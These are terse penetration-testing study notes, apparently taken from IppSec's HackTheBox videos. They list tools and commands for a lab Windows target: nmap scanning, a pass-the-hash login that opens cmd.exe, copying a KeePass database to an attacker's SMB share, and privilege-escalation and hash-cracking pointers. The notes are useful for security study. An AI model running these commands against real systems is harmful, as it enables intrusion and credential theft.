look at https://ippsec.rocks/ to search his vids

nmap -sC -sV -oA outputFile IP

-Pass the hash attack to login as a user
   pth-winexe -U jenkins/administrator //10.10.10.63 cmd.exe
   
-transfer files from powershell to attcker kali set up an smb server
  on Kali
    impacket-smb server PleaseSubscribe 'pwd'
  on vulnerable machine in powershell
   New-PSDrive -Name "FollowOnTwitter" -PSProvider "FileSystem" -Root "\\kaliIP\PleaseSubscribe"
   cp C:\Users\kohsuke\Documents\CEH.kdbx .
   
 - powersploit is a good powershell privesc script
    clone and use from developer branch as it enumerates more stuff
    
- common windows privesc exploit: rottenpotato

Hashes.org and hashkiller best website hash cracking

-gobuster 
  -k flag ignores ssl
  shorepoint has its own directory wordlist
  
-connect to webdav using cadaver tool

-ad DNS names to host file to hit them all
  Ippsec cronos is a good example
  
-oracle odat tool

Good website for basic enumeration for ports/services found: http://0daysecurity.com/penetration-testing/enumeration.html

